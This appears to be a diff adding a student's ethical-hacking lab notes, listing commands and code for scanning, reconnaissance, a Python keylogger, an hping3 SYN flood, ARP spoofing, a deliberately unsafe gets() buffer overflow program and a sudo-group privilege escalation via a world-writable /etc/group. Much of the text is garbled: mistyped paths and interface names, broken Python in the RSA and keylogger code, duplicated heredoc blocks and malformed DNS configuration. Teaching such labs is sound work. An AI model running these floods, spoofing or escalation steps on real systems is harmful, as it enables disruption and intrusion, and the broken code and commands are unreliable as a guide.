@@ -1,0 +1,455 @@
+
+EH LAB Syllabus 
+----------------------------------------------------------------------------------------------
+exp 1 
+--------------------------------
+1.1) demostaration of nmap , metasploit , burp suite , Angy IP scanner , LAn Guard , Net Stumbler (kali)
+
+nmap -version
+nmap localhost
+nmap -sV localhost
+nmap -top-ports 10 localhost
+msfconsole --version
+msfconsole
+which burpsuite
+burpsuite
+wget https://github.com/angryip/ipscan/releases/download/3.9.1/ipscan_3.9.1_amd64.deb
+sudo dpkg -i ipscan_3.9.1_amd64.deb
+ipscan
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+
+1.2) physical security ( linux oriented ) 
+
+sudo grub2-setpassword
+sudo passwd -l root
+sudo nano /etc/udev/rules.d/10-usbblock.rules
+
+SUBSYSTEM=="usb" , ATTR{authorized}="0"
+
+sudo grub2-editenv list
+
+TMOUT=300
+export TMOUT
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+
+1.3) Password attacks (linux)
+
+whoami
+uptime
+id
+sudo tail -n 15 /var /log/secure
+sudo fail2ban-client status sshd
+sudo tail -n 40 /var /log/secure
+sudo tail -n 20 /var /log/messages
+sudo fail2ban-client status sshd
+
+Status for the jail: sshd
+|- Filter
+| |- Currently failed: 32
+| `- Total failed: 49
+`- Actions
+|- Currently banned: 1
+
+sudo fail2ban-client get sshd banned
+203.0.113.55
+sudo iptables -L -n --line-numbers
+echo "SSH brute-force detected: 203.0.113.55 banned" | sudo tee /var /log/secur ity-aler ts.log
+SSH brute-force detected: 203.0.113.55 banned
+sudo fail2ban-client status sshd
+sudo passwd -l root
+sudo awk '/Oct 19 10:20:00/,/Oct 19 10:25:00/' /var /log/secure
+sudo chmod 640 /var / repor ts/incident-2025-10-19.txt
+ sudo ls -l /var / repor ts/incident-2025-10-19.txt
+# Summary status
+sudo ss -tuln
+----------------------------------------------------------------------------------------------
+exp 2 
+----------------------------------------------------
+2.1) demonstartion of footprinting and reconnaisacne tool (kali)
+
+recon-ng
+Dmitry
+dmitry -w certifiedhacker.com
+dmitry-pf certifiedhacker.com
+theHarvester -h
+theHarvester -s -d certifiedhacker.com
+whatweb certifiedhacker.com
+
+--------------------------------------------------------------------------------------------------------------------------
+
+
+2.2) use of crypt tool to encrypt and decrypt passwords using RSA --- vs code
+
+import math
+import random
+
+def is_prime(num):
+    """Checks if a number is prime."""
+    if num < 2:
+        return False
+    for i in range(2, int(math.sqrt(num)) + 1):
+        if num % i == 0:
+            return False
+    return True
+
+def generate_prime(min_val, max_val):
+    """Generates a random prime number within a given range."""
+    while True:
+        p = random.randint(min_val, max_val)
+        if is_prime(p):
+            return p
+
+def gcd(a, b):
+    """Calculates the greatest common divisor of two numbers."""
+    while b:
+        a, b = b, a % b
+    return a
+
+def mod_inverse(e, phi):
+    """Calculates the modular multiplicative inverse of e modulo phi."""
+    for d in range(2, phi):
+        if (e * d) % phi == 1:
+            return d
+    return None
+
+def generate_key_pair(keysize=100):
+    """Generates RSA public and private key pairs."""
+    p = generate_prime(2**(keysize//2 - 1), 2**(keysize//2))
+    q = generate_prime(2**(keysize//2 - 1), 2**(keysize//2))
+    
+    n = p * q
+    phi = (p - 1) * (q - 1)
+
+    # Choose e such that 1 < e < phi and gcd(e, phi) == 1
+    e = random.randint(2, phi - 1)
+    while gcd(e, phi) != 1:
+        e = random.randint(2, phi - 1)
+
+    # Calculate d, the modular inverse of e modulo phi
+    d = mod_inverse(e, phi)
+
+    return ((e, n), (d, n))
+
+def encrypt(message, public_key):
+    """Encrypts a message using the public key."""
+    e, n = public_key
+    cipher_text = [pow(ord(char), e, n) for char in message]
+    return cipher_text
+
+def decrypt(cipher_text, private_key):
+    """Decrypts a ciphertext using the private key."""
+    d, n = private_key
+    plain_text = [chr(pow(char, d, n)) for char in char in cipher_text]
+    return "".join(plain_text)
+
+if __name__ == "__main__":
+    # Demonstrate with a small key size for quick execution
+    # For real-world security, use a much larger keysize (e.g., 2048 or 4096)
+    keysize = 10  # Very small for demonstration purposes
+    print(f"Generating RSA key pair with keysize: {keysize} bits...")
+    public_key, private_key = generate_key_pair(keysize)
+    print(f"Public Key (e, n): {public_key}")
+    print(f"Private Key (d, n): {private_key}")
+
+    original_message = "Hello, RSA!"
+    print(f"\nOriginal Message: {original_message}")
+
+    encrypted_message = encrypt(original_message, public_key)
+    print(f"Encrypted Message (integers): {encrypted_message}")
+
+    decrypted_message = decrypt(encrypted_message, private_key)
+    print(f"Decrypted Message: {decrypted_message}")
+
+    # Illustrate strength by showing the difficulty of factoring n
+    print("\n--- Demonstrating RSA Strength ---")
+    print(f"The security of RSA relies on the difficulty of factoring 'n': {public_key[1]}")
+    print("If 'n' is a very large number (e.g., hundreds of digits),")
+    print("it becomes computationally infeasible to find its prime factors (p and q),")
+    print("which are necessary to derive the private key 'd' from the public key.")
+    print("Using a small keysize like 10 bits makes factoring trivial, but with 2048+ bits, it's virtually impossible with current technology.")
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+2.3) perform sql injection (kali)
+
+ip addr show
+ping 192.168.1.11
+
+open DVWA
+
+--------------------------------------------------------------------
+2.4)IP spoofing using raw linux commands (kali)
+
+sudo ip link set dev eth0 up
+sudo ip link set dev eth0 up
+sudo ip addr add 192.168.1.50/24 dev etho
+sudo ip route add default via 192.168.1.1
+echo "nameserver 1.1.1.1 | sudo tee /etc/ resolv.conf
+ip addr show dev eth0
+ip route show
+ip addr
+ip route show
+ping -c 3 10.20.2.185
+
+---------------------------------------------------------------------
+exp3 
+------------------
+3.1)create a simple keylogger using python (vsc)
+
+from pynput import keyboard
+
+def on_press(key):
+ try:
+     print(f"[KEY] {key.char}")
+ except AttributeError:
+     print(f"[SPECIAL] {key}")
+
+ def on_release(key):
+ if key == keyboard.Key.esc:
+      print(" Exiting keylogger.")
+      return False # Stops listener
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+  listener.join()
+
+notepad -- my name is padma
+
+----------------------------------------------------------------------
+3.2)demonstarte dos attack on apache server  and perform preventive measure by conf apppropriate files (kali)
+
+curl 192.168.163.129
+sudo hping3 -S --flood -p 80 --rand-source 192.168.163.129
+
+
+----------------------------------------------------------------------
+3.3) conf DNS and reverse DNS (linux)
+
+sudo apt install bind9
+cd /etc/bind
+/etc/bind$ ls
+/etc/bind$ hostnamectl status
+/etc/bind$ sudo vim /etc/hosts
+/etc/bind$ cat /etc/hosts
+hostname
+dnsdomainname
+hostname --fqdn
+ls
+sudo cp named.conf.options named.cong.options.orig
+sudo vim named.conf.options
+sudo cp named.conf.local named.conf.local.orig
+sudo gedit named.conf.local
+
+edits --
+
+//
+// Do any local configuration here
+// Consider adding the 1918 zones here, if they are not used in your // organization
+//include "/etc/bind/zones.rfc1918"; //forward lookup zone
+zone "student" IN }
+type master;
+file "/etc/bind/db.student.local";
+};
+//reverse lookup zone
+zone "0.16.172.in-addr.arpa" IN {
+type master;
+file "/etc/bind/db.student.local";
+},
+
+
+
+named-checkconf
+sudo gedit named.conf.options
+ls
+cat named.config.local
+sudo cp db.local db.student.local
+sudo gedit db.student.local
+named-checkzone student.local db.student.local
+sudo cp db.127 db.0.16.172
+named-checkconf
+sudo service bind9 restart
+sudo service bind9 status
+
+
+
+--------------------------------------------------------------------
+
+exp 4 
+-----------------------
+4.1) ARP poisoning (kali linux)
+
+ip a
+arp -a ------ linuxs
+echo 1/proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+#should print "1"
+arpspoof -i eth0-t 192.168.1.10 192.168.1.1
+tcpdump-i eth0
+arp -a (linux)
+
+
+------------------------------------------------------------------------
+
+
+4.2) use metasploit to exploit other system (kali)
+
+nmap -sV 192.168.1.11
+sudo msfdb init
+msfconsole
+
+----------------------------------------------------------------------
+
+
+4.3) buffer overflow (linux)
+
+mkdir -p-/bufoverflow_lab && cd -/bufoverflow_lab
+-/bufoverflow_lab$ sudo apt update
+/bufoverflow_lab$ sudo apt install -y build-essential gdb binutils
+/bufoverflow lab$ cat > vuln.c <<'EOF'
+
+console code-----
+
+#include <stdio.h>
+#include <string.h>
+void secret(void) {
+puts(">>> SECRET: You reached the secret function!");
+}
+void vulnerable(void) {
+char buf [64];
+puts("Enter some text:");
+/* intentionally unsafe: used only for education */
+gets(buf); /* unsafe no bounds checking */
+printf("You entered: %s\n", buf);
+}
+int main(void) {
+puts("Simple buffer overflow demo");
+vulnerable();
+puts("Program finished normally.");
+return 0;
+}
+EOF
+puts("Program finished normally."):
+return 0;
+}
+EOF
+
+
+
+Commands ---
+/bufoverflow lab$ cat > safe demo.c <<'EOF'
+/bufoverflow_lab$ gcc -Wall -Wextra -o safe_demo.c
+
+
+
+------------------------------------------------------------------------
+4.4) local privillage escalation (kali)
+
+sudo su
+sudo useradd -m testuser
+sudo passwd testuser
+su- testuser
+ls -1 /etc/group
+sudo cp /etc/group /etc/group.backup
+sudo chmod 666 /etc/group
+ls -1/etc/group
+sudo cp /etc/group /etc/group.backup
+sudo chmod 666 /etc/group
+ls -1/etc/group
+su - testuser
+
+$ grep sudo /etc/group
+sudo:x:27:kali
+$ echo "$(grep sudo /etc/group | sed 's/$/,testuser/')" > /tmp/newgroup
+$ cat /tmp/newgroup
+sudo:x:27:kali,testuser
+$ nano /etc/group
+$ sed -i 's/^\(sudo:x:[0-9]*:.*\)$/\1,testuser/' /etc/group
+sed: couldn't open temporary file /etc/sed5h2YsP: Permission denied
+$ exit
+
+
+su- testuser
+$ id
+su- testuser
+uid=1001(testuser) gid=1001(testuser) groups=1001(testuser),27(sudo) $ groups
+testuser sudo
+$ sudo whoami
+[sudo] password for testuser:
+root
+
+-------------------------------------------------------------------------
+
+exp5 
+-------------------
+5.1) NMAP scan for :: ack , syn , fin, null , xmas (kali)
+
+ping 192.168.1.11 -c 4
+sudo nmap -sS 192.168.1.11 
+sudo nmap -sA 192.168.1.11
+sudo nmap -sN 192.168.1.11
+sudo nmap -sF 192.168.1.11
+sudo nmap -sX 192.168.1.11
+
+
+-----------------------------------------------------------------------
+5.2) session impersonation using firefox and tamper data add on 
+
+use DVWA 
+
+----------------------------------------------------------------------
+5.3) NIS and NFS conf (kali)
+
+sudo apt install nfs-common nfs-utils​
+sudo service rpcbind start
+sudo service nfs-kernel-server start (server only)
+
+sudo mount -t nfs <server_ip>:/shared/directory /mnt/mountpoint
+
+Example: sudo mount.nfs 192.168.0.10:/tmp/shared /mnt/nfsshare​
+showmount -e <server_ip>
+sudo exportfs -v (show exported shares)
+sudo exportfs -a (export all entries from /etc/exports)
+sudo umount /mnt/mountpoint
+nfsstat (show NFS statistics)
+nfsiostat (show NFS I/O statistics)
+nfsconf, nfsidmap (for configuration and V4 identity mapping)
+sudo apt install nis
+sudo service ypbind start
+ypwhich (show current NIS server)
+
+ypcat passwd (display 'passwd' NIS map)
+
+ypcat hosts (display 'hosts' NIS map)
+sudo service ypserv start (start NIS server daemon)
+ypdomainname <domainname>
+/etc/yp.conf
+/etc/nsswitch.conf
+
+
+------------------------------------------------------------------------------
+
+exp 6 
+---------------------
+6.1) use wireshark sniffer to capture network traffic (kali)
+
+sudo apt install wireshark
+wireshark
+wireshark -h
+tshark -i <interface>
+tshark -f "<filter>"
+tshark -r <file>
+wireshark -D
+
+wireshark -i <interface> -f "<filter>" 
+wireshark -w <outputfile>
+wireshark -r <inputfile>
+sudo dpkg-reconfigure wireshark-common
+sudo usermod -aG wireshark <your_username>
+wireshark --list-interfaces 
+wireshark -Y "<display filter>"
+
+
+
+
